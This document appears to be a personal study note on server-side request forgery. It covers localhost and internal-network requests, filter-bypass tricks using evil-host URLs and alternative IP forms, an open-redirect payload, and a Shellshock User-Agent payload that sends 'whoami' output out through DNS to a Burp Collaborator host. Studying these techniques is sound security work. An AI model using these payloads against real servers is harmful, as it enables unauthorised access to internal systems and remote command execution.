# Server Side Request Forgery
SSRF is a vuln which makes a server to make requests to unintended location  
For example we can make server app which makes requests to external API, request loopback address
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```
In such case attacker could potentially bypass any restrictions of admin panel, because request is made from authorized server.  

Also we can craft arbitrary request to another back-end internal server, providing its IP in palcve of 127.0.0.1  
Also we can scan full network range (e.g. 192.168.0.x) to detect any differing responses (for example 404 after 500) and detect active and available back-end servers.  

## Bypassing protection
### Black-list
Common protection is black-listing of some common things such as 127.0.0.1, localhost or /admin. To bypass this we can try:
* alternative IP representation of 127.0.0.1 such as 2130706433, 017700000001, or 127.1
* Register own domain name which resolves to 127.0.0.1. We can use spoofed.burpcollaborator.net for this purpose.
* Obfuscate blocked strings using URL encoding (or double encoding) or case variation.
* Provide a URL which you control that redirects to target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters. 

### White-list  
We can bypass white-lsiting by such techniques:
* credentials: `https://expected-host:fakepassword@evil-host`
* DNS hierarchy leveraging: `https://expected-host.evil-host`
* \# to indicate a URL fragment: `https://evil-host#expected-host`
* URL-encoding or double-encoding
* combinations of this techniques
### Open-redirect
`/product/nextProduct?currentProductId=6&path=http://evil-user.net`  

## Blind SSRF
We can detect blind ssrf with OAST techniques  
DNS-lookup for collaborator server  
We can put malicious URL into Referer header  
Also we can exploit shellshock vulnerabiulity, pasting such exploit into User-Agent header:  
`() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`  
And from this pooint we can change hosts on which we execute command with Referrer header, so we can force interaction with burp collaborator from internal server.  
